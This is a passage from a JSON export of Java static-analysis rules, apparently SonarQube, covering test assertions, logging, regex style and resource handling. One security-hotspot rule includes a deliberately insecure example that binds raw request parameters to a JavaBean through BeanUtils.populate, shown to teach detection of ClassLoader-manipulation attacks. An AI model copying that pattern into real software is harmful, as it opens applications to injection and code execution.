            "htmlDesc": "<p>Adding messages to JUnit, FEST and AssertJ assertions is an investment in your future productivity. Spend a few seconds writing them now, and\nyou'll save a lot of time on the other end when either the tests fail and you need to quickly diagnose the problem, or when you need to maintain the\ntests and the assertion messages work as a sort of documentation.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nassertEquals(4, list.size());  // Noncompliant\n\ntry {\n  fail();  // Noncompliant\n} catch (Exception e) {\n  assertThat(list.get(0)).isEqualTo(\"pear\");  // Noncompliant\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nassertEquals(\"There should have been 4 Fruits in the list\", 4, list.size());\n\ntry {\n  fail(\"And exception is expected here\");\n} catch (Exception e) {\n  assertThat(list.get(0)).as(\"check first element\").overridingErrorMessage(\"The first element should be a pear, not a %s\", list.get(0)).isEqualTo(\"pear\");\n}\n</pre>",
            "mdDesc": "<p>Adding messages to JUnit, FEST and AssertJ assertions is an investment in your future productivity. Spend a few seconds writing them now, and\nyou'll save a lot of time on the other end when either the tests fail and you need to quickly diagnose the problem, or when you need to maintain the\ntests and the assertion messages work as a sort of documentation.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nassertEquals(4, list.size());  // Noncompliant\n\ntry {\n  fail();  // Noncompliant\n} catch (Exception e) {\n  assertThat(list.get(0)).isEqualTo(\"pear\");  // Noncompliant\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nassertEquals(\"There should have been 4 Fruits in the list\", 4, list.size());\n\ntry {\n  fail(\"And exception is expected here\");\n} catch (Exception e) {\n  assertThat(list.get(0)).as(\"check first element\").overridingErrorMessage(\"The first element should be a pear, not a %s\", list.get(0)).isEqualTo(\"pear\");\n}\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "junit",
                "tests"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S3416",
            "repo": "java",
            "name": "Loggers should be named for their enclosing classes",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>It is convention to name each class's logger for the class itself. Doing so allows you to set up clear, communicative logger configuration. Naming\nloggers by some other convention confuses configuration, and using the same class name for multiple class loggers prevents the granular configuration\nof each class' logger. Some libraries, such as SLF4J warn about this, but not all do.</p>\n<p>This rule raises an issue when a logger is not named for its enclosing class.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class MyClass {\n  private final static Logger LOG = LoggerFactory.getLogger(WrongClass.class);  // Noncompliant; multiple classes using same logger\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class MyClass {\n  private final static Logger LOG = LoggerFactory.getLogger(MyClass.class);\n}\n</pre>",
            "mdDesc": "<p>It is convention to name each class's logger for the class itself. Doing so allows you to set up clear, communicative logger configuration. Naming\nloggers by some other convention confuses configuration, and using the same class name for multiple class loggers prevents the granular configuration\nof each class' logger. Some libraries, such as SLF4J warn about this, but not all do.</p>\n<p>This rule raises an issue when a logger is not named for its enclosing class.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class MyClass {\n  private final static Logger LOG = LoggerFactory.getLogger(WrongClass.class);  // Noncompliant; multiple classes using same logger\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class MyClass {\n  private final static Logger LOG = LoggerFactory.getLogger(MyClass.class);\n}\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "confusing"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1126",
            "repo": "java",
            "name": "Return of boolean expressions should not be wrapped into an \"if-then-else\" statement",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Return of boolean literal statements wrapped into <code>if-then-else</code> ones should be simplified.</p>\n<p>Similarly, method invocations wrapped into <code>if-then-else</code> differing only from boolean literals should be simplified into a single\ninvocation.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nboolean foo(Object param) {\n  if (expression) { // Noncompliant\n    bar(param, true, \"qix\");\n  } else {\n    bar(param, false, \"qix\");\n  }\n\n  if (expression) {  // Noncompliant\n    return true;\n  } else {\n    return false;\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nboolean foo(Object param) {\n  bar(param, expression, \"qix\");\n\n  return expression;\n}\n</pre>",
            "mdDesc": "<p>Return of boolean literal statements wrapped into <code>if-then-else</code> ones should be simplified.</p>\n<p>Similarly, method invocations wrapped into <code>if-then-else</code> differing only from boolean literals should be simplified into a single\ninvocation.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nboolean foo(Object param) {\n  if (expression) { // Noncompliant\n    bar(param, true, \"qix\");\n  } else {\n    bar(param, false, \"qix\");\n  }\n\n  if (expression) {  // Noncompliant\n    return true;\n  } else {\n    return false;\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nboolean foo(Object param) {\n  bar(param, expression, \"qix\");\n\n  return expression;\n}\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "clumsy"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "2min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "2min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "2min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "2min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S4512",
            "repo": "java",
            "name": "Setting JavaBean properties is security-sensitive",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Setting JavaBean properties is security sensitive. Doing it with untrusted values has led in the past to the following vulnerability:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0114\">CVE-2014-0114</a> </li>\n</ul>\n<p>JavaBeans can have their properties or nested properties set by population functions. An attacker can leverage this feature to push into the\nJavaBean malicious data that can compromise the software integrity. A typical attack will try to manipulate the ClassLoader and finally execute\nmalicious code.</p>\n<p>This rule raises an issue when:</p>\n<ul>\n  <li> BeanUtils.populate(...) or BeanUtilsBean.populate(...) from <a href=\"http://commons.apache.org/proper/commons-beanutils/\">Apache Commons\n  BeanUtils</a> are called </li>\n  <li> BeanUtils.setProperty(...) or BeanUtilsBean.setProperty(...) from <a href=\"http://commons.apache.org/proper/commons-beanutils/\">Apache Commons\n  BeanUtils</a> are called </li>\n  <li> org.springframework.beans.BeanWrapper.setPropertyValue(...) or org.springframework.beans.BeanWrapper.setPropertyValues(...) from Spring is\n  called </li>\n</ul>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> the new property values might have been tampered with or provided by an untrusted source. </li>\n  <li> sensitive properties can be modified, for example: <code>class.classLoader</code> </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Sanitize all values used as JavaBean properties.</p>\n<p>Don't set any sensitive properties. Keep full control over which properties are set. If the property names are provided by an unstrusted source,\nfilter them with a whitelist.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nCompany bean = new Company();\nHashMap map = new HashMap();\nEnumeration names = request.getParameterNames();\nwhile (names.hasMoreElements()) {\n    String name = (String) names.nextElement();\n    map.put(name, request.getParameterValues(name));\n}\nBeanUtils.populate(bean, map); // Sensitive: \"map\" is populated with data coming from user input, here \"request.getParameterNames()\"\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A1-Injection\">OWASP Top 10 2017 Category A1</a> - Injection </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/15.html\">MITRE, CWE-15</a> - External Control of System or Configuration Setting </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/hDdGBQ\">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://find-sec-bugs.github.io/bugs.htm#BEAN_PROPERTY_INJECTION\">BEAN_PROPERTY_INJECTION</a> </li>\n</ul>",
            "mdDesc": "<p>Setting JavaBean properties is security sensitive. Doing it with untrusted values has led in the past to the following vulnerability:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0114\">CVE-2014-0114</a> </li>\n</ul>\n<p>JavaBeans can have their properties or nested properties set by population functions. An attacker can leverage this feature to push into the\nJavaBean malicious data that can compromise the software integrity. A typical attack will try to manipulate the ClassLoader and finally execute\nmalicious code.</p>\n<p>This rule raises an issue when:</p>\n<ul>\n  <li> BeanUtils.populate(...) or BeanUtilsBean.populate(...) from <a href=\"http://commons.apache.org/proper/commons-beanutils/\">Apache Commons\n  BeanUtils</a> are called </li>\n  <li> BeanUtils.setProperty(...) or BeanUtilsBean.setProperty(...) from <a href=\"http://commons.apache.org/proper/commons-beanutils/\">Apache Commons\n  BeanUtils</a> are called </li>\n  <li> org.springframework.beans.BeanWrapper.setPropertyValue(...) or org.springframework.beans.BeanWrapper.setPropertyValues(...) from Spring is\n  called </li>\n</ul>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> the new property values might have been tampered with or provided by an untrusted source. </li>\n  <li> sensitive properties can be modified, for example: <code>class.classLoader</code> </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Sanitize all values used as JavaBean properties.</p>\n<p>Don't set any sensitive properties. Keep full control over which properties are set. If the property names are provided by an unstrusted source,\nfilter them with a whitelist.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nCompany bean = new Company();\nHashMap map = new HashMap();\nEnumeration names = request.getParameterNames();\nwhile (names.hasMoreElements()) {\n    String name = (String) names.nextElement();\n    map.put(name, request.getParameterValues(name));\n}\nBeanUtils.populate(bean, map); // Sensitive: \"map\" is populated with data coming from user input, here \"request.getParameterNames()\"\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A1-Injection\">OWASP Top 10 2017 Category A1</a> - Injection </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/15.html\">MITRE, CWE-15</a> - External Control of System or Configuration Setting </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/hDdGBQ\">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://find-sec-bugs.github.io/bugs.htm#BEAN_PROPERTY_INJECTION\">BEAN_PROPERTY_INJECTION</a> </li>\n</ul>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert",
                "cwe",
                "owasp-a1"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "15min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "15min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "15min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "15min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "SECURITY_HOTSPOT"
        },
        {
            "key": "java:S5843",
            "repo": "java",
            "name": "Regular expressions should not be too complicated",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Overly complicated regular expressions are hard to read and to maintain and can easily cause hard-to-find bugs. If a regex is too complicated, you\nshould consider replacing it or parts of it with regular code or splitting it apart into multiple patterns at least.</p>\n<p>The complexity of a regular expression is determined as follows:</p>\n<p>Each of the following operators increases the complexity by an amount equal to the current nesting level and also increases the current nesting\nlevel by one for its arguments:</p>\n<ul>\n  <li> <code>|</code> <del></del> when multiple <code>|</code> operators are used together, the subsequent ones only increase the complexity by 1\n  </li>\n  <li> <code>&amp;&amp;</code> (inside character classes) <del></del> when multiple <code>&amp;&amp;</code> operators are used together, the\n  subsequent ones only increase the complexity by 1 </li>\n  <li> Quantifiers (<code>*</code>, <code>+</code>, <code>?</code>, <code>{n,m}</code>, <code>{n,}</code> or <code>{n}</code>) </li>\n  <li> Non-capturing groups that set flags (such as <code>(?i:some_pattern)</code> or <code>(?i)some_pattern</code>) </li>\n  <li> Lookahead and lookbehind assertions </li>\n</ul>\n<p>Additionally, each use of the following features increase the complexity by 1 regardless of nesting:</p>\n<ul>\n  <li> character classes </li>\n  <li> back references </li>\n</ul>\n<p>If a regular expression is split among multiple variables, the complexity is calculated for each variable individually, not for the whole regular\nexpression. If a regular expression is split over multiple lines, each line is treated individually if it is accompanied by a comment (either a Java\ncomment or a comment within the regular expression), otherwise the regular expression is analyzed as a whole.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nif (dateString.matches(\"^(?:(?:31(\\\/|-|\\\\.)(?:0?[13578]|1[02]))\\\\1|(?:(?:29|30)(\\\/|-|\\\\.)(?:0?[13-9]|1[0-2])\\\\2))(?:(?:1[6-9]|[2-9]\\\\d)?\\\\d{2})$|^(?:29(\\\/|-|\\\\.)0?2\\\\3(?:(?:(?:1[6-9]|[2-9]\\\\d)?(?:0[48]|[2468][048]|[13579][26])|(?:(?:16|[2468][048]|[3579][26])00))))$|^(?:0?[1-9]|1\\\\d|2[0-8])(\\\/|-|\\\\.)(?:(?:0?[1-9])|(?:1[0-2]))\\\\4(?:(?:1[6-9]|[2-9]\\\\d)?\\\\d{2})$\")) {\n    handleDate(dateString);\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n    if (dateString.matches(\"^\\\\d{1,2}([-/.])\\\\d{1,2}\\\\1\\\\d{1,4}$\")) {\n        String dateParts[] = dateString.split(\"[-/.]\");\n        int day = Integer.parseInt(dateParts[0]);\n        int month = Integer.parseInt(dateParts[1]);\n        int year = Integer.parseInt(dateParts[2]);\n        // Put logic to validate and process the date based on its integer parts here\n    }\n</pre>\n<h2>Exceptions</h2>\n<p>Regular expressions are only analyzed if all parts of the regular expression are either string literals, effectively final local variables or\n`static final` fields, all of which can be combined using the `+` operator.</p>\n<p>When a regular expression is split among multiple variables or commented lines, each part is only analyzed if it is syntactically valid by\nitself.</p>",
            "mdDesc": "<p>Overly complicated regular expressions are hard to read and to maintain and can easily cause hard-to-find bugs. If a regex is too complicated, you\nshould consider replacing it or parts of it with regular code or splitting it apart into multiple patterns at least.</p>\n<p>The complexity of a regular expression is determined as follows:</p>\n<p>Each of the following operators increases the complexity by an amount equal to the current nesting level and also increases the current nesting\nlevel by one for its arguments:</p>\n<ul>\n  <li> <code>|</code> <del></del> when multiple <code>|</code> operators are used together, the subsequent ones only increase the complexity by 1\n  </li>\n  <li> <code>&amp;&amp;</code> (inside character classes) <del></del> when multiple <code>&amp;&amp;</code> operators are used together, the\n  subsequent ones only increase the complexity by 1 </li>\n  <li> Quantifiers (<code>*</code>, <code>+</code>, <code>?</code>, <code>{n,m}</code>, <code>{n,}</code> or <code>{n}</code>) </li>\n  <li> Non-capturing groups that set flags (such as <code>(?i:some_pattern)</code> or <code>(?i)some_pattern</code>) </li>\n  <li> Lookahead and lookbehind assertions </li>\n</ul>\n<p>Additionally, each use of the following features increase the complexity by 1 regardless of nesting:</p>\n<ul>\n  <li> character classes </li>\n  <li> back references </li>\n</ul>\n<p>If a regular expression is split among multiple variables, the complexity is calculated for each variable individually, not for the whole regular\nexpression. If a regular expression is split over multiple lines, each line is treated individually if it is accompanied by a comment (either a Java\ncomment or a comment within the regular expression), otherwise the regular expression is analyzed as a whole.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nif (dateString.matches(\"^(?:(?:31(\\\/|-|\\\\.)(?:0?[13578]|1[02]))\\\\1|(?:(?:29|30)(\\\/|-|\\\\.)(?:0?[13-9]|1[0-2])\\\\2))(?:(?:1[6-9]|[2-9]\\\\d)?\\\\d{2})$|^(?:29(\\\/|-|\\\\.)0?2\\\\3(?:(?:(?:1[6-9]|[2-9]\\\\d)?(?:0[48]|[2468][048]|[13579][26])|(?:(?:16|[2468][048]|[3579][26])00))))$|^(?:0?[1-9]|1\\\\d|2[0-8])(\\\/|-|\\\\.)(?:(?:0?[1-9])|(?:1[0-2]))\\\\4(?:(?:1[6-9]|[2-9]\\\\d)?\\\\d{2})$\")) {\n    handleDate(dateString);\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n    if (dateString.matches(\"^\\\\d{1,2}([-/.])\\\\d{1,2}\\\\1\\\\d{1,4}$\")) {\n        String dateParts[] = dateString.split(\"[-/.]\");\n        int day = Integer.parseInt(dateParts[0]);\n        int month = Integer.parseInt(dateParts[1]);\n        int year = Integer.parseInt(dateParts[2]);\n        // Put logic to validate and process the date based on its integer parts here\n    }\n</pre>\n<h2>Exceptions</h2>\n<p>Regular expressions are only analyzed if all parts of the regular expression are either string literals, effectively final local variables or\n`static final` fields, all of which can be combined using the `+` operator.</p>\n<p>When a regular expression is split among multiple variables or commented lines, each part is only analyzed if it is syntactically valid by\nitself.</p>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "regex"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [
                {
                    "key": "maxComplexity",
                    "htmlDesc": "The maximum authorized complexity.",
                    "defaultValue": "20",
                    "type": "INTEGER"
                }
            ],
            "defaultDebtRemFnType": "LINEAR_OFFSET",
            "defaultDebtRemFnCoeff": "2min",
            "defaultDebtRemFnOffset": "8min",
            "effortToFixDescription": "number of complexity points over the configurable limit",
            "debtOverloaded": false,
            "debtRemFnType": "LINEAR_OFFSET",
            "debtRemFnCoeff": "2min",
            "debtRemFnOffset": "8min",
            "defaultRemFnType": "LINEAR_OFFSET",
            "defaultRemFnGapMultiplier": "2min",
            "defaultRemFnBaseEffort": "8min",
            "remFnType": "LINEAR_OFFSET",
            "remFnGapMultiplier": "2min",
            "remFnBaseEffort": "8min",
            "remFnOverloaded": false,
            "gapDescription": "number of complexity points over the configurable limit",
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1488",
            "repo": "java",
            "name": "Local variables should not be declared and then immediately returned or thrown",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Declaring a variable only to immediately return or throw it is a bad practice.</p>\n<p>Some developers argue that the practice improves code readability, because it enables them to explicitly name what is being returned. However, this\nvariable is an internal implementation detail that is not exposed to the callers of the method. The method name should be sufficient for callers to\nknow exactly what will be returned.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic long computeDurationInMilliseconds() {\n  long duration = (((hours * 60) + minutes) * 60 + seconds ) * 1000 ;\n  return duration;\n}\n\npublic void doSomething() {\n  RuntimeException myException = new RuntimeException();\n  throw myException;\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic long computeDurationInMilliseconds() {\n  return (((hours * 60) + minutes) * 60 + seconds ) * 1000 ;\n}\n\npublic void doSomething() {\n  throw new RuntimeException();\n}\n</pre>",
            "mdDesc": "<p>Declaring a variable only to immediately return or throw it is a bad practice.</p>\n<p>Some developers argue that the practice improves code readability, because it enables them to explicitly name what is being returned. However, this\nvariable is an internal implementation detail that is not exposed to the callers of the method. The method name should be sufficient for callers to\nknow exactly what will be returned.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic long computeDurationInMilliseconds() {\n  long duration = (((hours * 60) + minutes) * 60 + seconds ) * 1000 ;\n  return duration;\n}\n\npublic void doSomething() {\n  RuntimeException myException = new RuntimeException();\n  throw myException;\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic long computeDurationInMilliseconds() {\n  return (((hours * 60) + minutes) * 60 + seconds ) * 1000 ;\n}\n\npublic void doSomething() {\n  throw new RuntimeException();\n}\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "clumsy"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "2min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "2min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "2min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "2min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2699",
            "repo": "java",
            "name": "Tests should include assertions",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>A test case without assertions ensures only that no exceptions are thrown. Beyond basic runnability, it ensures nothing about the behavior of the\ncode under test.</p>\n<p>This rule raises an exception when no assertions from any of the following known frameworks are found in a test:</p>\n<ul>\n  <li> AssertJ </li>\n  <li> Awaitility </li>\n  <li> EasyMock </li>\n  <li> Eclipse Vert.x </li>\n  <li> Fest 1.x and 2.x </li>\n  <li> Hamcrest </li>\n  <li> JMock </li>\n  <li> JMockit </li>\n  <li> JUnit </li>\n  <li> Mockito </li>\n  <li> Rest-assured 2.x, 3.x and 4.x </li>\n  <li> RxJava 1.x and 2.x </li>\n  <li> Selenide </li>\n  <li> Spring's <code>org.springframework.test.web.servlet.ResultActions.andExpect()</code> </li>\n  <li> Truth Framework </li>\n  <li> WireMock </li>\n</ul>\n<p>Furthermore, as new or custom assertion frameworks may be used, the rule can be parametrized to define specific methods that will also be\nconsidered as assertions. No issue will be raised when such methods are found in test cases. The parameter value should have the following format\n<code>&lt;FullyQualifiedClassName&gt;#&lt;MethodName&gt;</code>, where <code>MethodName</code> can end with the wildcard character. For constructors,\nthe pattern should be <code>&lt;FullyQualifiedClassName&gt;#&lt;init&gt;</code>.</p>\n<p>Example:&nbsp;<code>com.company.CompareToTester#compare*,com.company.CustomAssert#customAssertMethod,com.company.CheckVerifier#&lt;init&gt;</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n@Test\npublic void testDoSomething() {  // Noncompliant\n  MyClass myClass = new MyClass();\n  myClass.doSomething();\n}\n</pre>\n<h2>Compliant Solution</h2>\n<p>Example when <code>com.company.CompareToTester#compare*</code> is used as parameter to the rule.</p>\n<pre>\nimport com.company.CompareToTester;\n\n@Test\npublic void testDoSomething() {\n  MyClass myClass = new MyClass();\n  assertNull(myClass.doSomething());  // JUnit assertion\n  assertThat(myClass.doSomething()).isNull();  // Fest assertion\n}\n\n@Test\npublic void testDoSomethingElse() {\n  MyClass myClass = new MyClass();\n  new CompareToTester().compareWith(myClass);  // Compliant - custom assertion method defined as rule parameter\n  CompareToTester.compareStatic(myClass);  // Compliant\n}\n</pre>",
            "mdDesc": "<p>A test case without assertions ensures only that no exceptions are thrown. Beyond basic runnability, it ensures nothing about the behavior of the\ncode under test.</p>\n<p>This rule raises an exception when no assertions from any of the following known frameworks are found in a test:</p>\n<ul>\n  <li> AssertJ </li>\n  <li> Awaitility </li>\n  <li> EasyMock </li>\n  <li> Eclipse Vert.x </li>\n  <li> Fest 1.x and 2.x </li>\n  <li> Hamcrest </li>\n  <li> JMock </li>\n  <li> JMockit </li>\n  <li> JUnit </li>\n  <li> Mockito </li>\n  <li> Rest-assured 2.x, 3.x and 4.x </li>\n  <li> RxJava 1.x and 2.x </li>\n  <li> Selenide </li>\n  <li> Spring's <code>org.springframework.test.web.servlet.ResultActions.andExpect()</code> </li>\n  <li> Truth Framework </li>\n  <li> WireMock </li>\n</ul>\n<p>Furthermore, as new or custom assertion frameworks may be used, the rule can be parametrized to define specific methods that will also be\nconsidered as assertions. No issue will be raised when such methods are found in test cases. The parameter value should have the following format\n<code>&lt;FullyQualifiedClassName&gt;#&lt;MethodName&gt;</code>, where <code>MethodName</code> can end with the wildcard character. For constructors,\nthe pattern should be <code>&lt;FullyQualifiedClassName&gt;#&lt;init&gt;</code>.</p>\n<p>Example:&nbsp;<code>com.company.CompareToTester#compare*,com.company.CustomAssert#customAssertMethod,com.company.CheckVerifier#&lt;init&gt;</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n@Test\npublic void testDoSomething() {  // Noncompliant\n  MyClass myClass = new MyClass();\n  myClass.doSomething();\n}\n</pre>\n<h2>Compliant Solution</h2>\n<p>Example when <code>com.company.CompareToTester#compare*</code> is used as parameter to the rule.</p>\n<pre>\nimport com.company.CompareToTester;\n\n@Test\npublic void testDoSomething() {\n  MyClass myClass = new MyClass();\n  assertNull(myClass.doSomething());  // JUnit assertion\n  assertThat(myClass.doSomething()).isNull();  // Fest assertion\n}\n\n@Test\npublic void testDoSomethingElse() {\n  MyClass myClass = new MyClass();\n  new CompareToTester().compareWith(myClass);  // Compliant - custom assertion method defined as rule parameter\n  CompareToTester.compareStatic(myClass);  // Compliant\n}\n</pre>",
            "severity": "BLOCKER",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "junit",
                "tests"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [
                {
                    "key": "customAssertionMethods",
                    "htmlDesc": "Comma-separated list of fully qualified method symbols that should be considered as assertion methods. The wildcard character can be used at the end of the method name.",
                    "type": "STRING"
                }
            ],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "10min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "10min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "10min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "10min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S5842",
            "repo": "java",
            "name": "Regex repetition pattern's body should not match the empty String",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>A regex should never include a repetitive pattern whose body would match the empty String. This is usually a sign that a part of the regex is\nredundant or does not do what the author intended.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n\"(?:)*\"      // same as the empty regex, the '*' accomplishes nothing\n\"(?:|x)*\"    // same as the empty regex, the alternative has no effect\n\"(?:x|)*\"    // same as 'x*', the empty alternative has no effect\n\"(?:x*|y*)*\" // same as 'x*', the first alternative would always match, y* is never tried\n\"(?:x?)*\"    // same as 'x*'\n\"(?:x?)+\"    // same as 'x*'\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n\"x*\"\n</pre>",
            "mdDesc": "<p>A regex should never include a repetitive pattern whose body would match the empty String. This is usually a sign that a part of the regex is\nredundant or does not do what the author intended.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n\"(?:)*\"      // same as the empty regex, the '*' accomplishes nothing\n\"(?:|x)*\"    // same as the empty regex, the alternative has no effect\n\"(?:x|)*\"    // same as 'x*', the empty alternative has no effect\n\"(?:x*|y*)*\" // same as 'x*', the first alternative would always match, y* is never tried\n\"(?:x?)*\"    // same as 'x*'\n\"(?:x?)+\"    // same as 'x*'\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n\"x*\"\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "regex"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S3546",
            "repo": "java",
            "name": "Custom resources should be closed",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Leaking resources in an application is never a good idea, as it can lead to memory issues, and even the crash of the application. This rule\ntemplate allows you to specify which constructions open a resource and how it is closed in order to raise issue within a method scope when custom\nresources are leaked.</p>\n<h2>See also</h2>\n<ul>\n  <li> <a href='/coding_rules#rule_key=java%3AS2095'>S2095</a> - Resources should be closed </li>\n</ul>",
            "mdDesc": "<p>Leaking resources in an application is never a good idea, as it can lead to memory issues, and even the crash of the application. This rule\ntemplate allows you to specify which constructions open a resource and how it is closed in order to raise issue within a method scope when custom\nresources are leaked.</p>\n<h2>See also</h2>\n<ul>\n  <li> {rule:java:S2095} - Resources should be closed </li>\n</ul>",
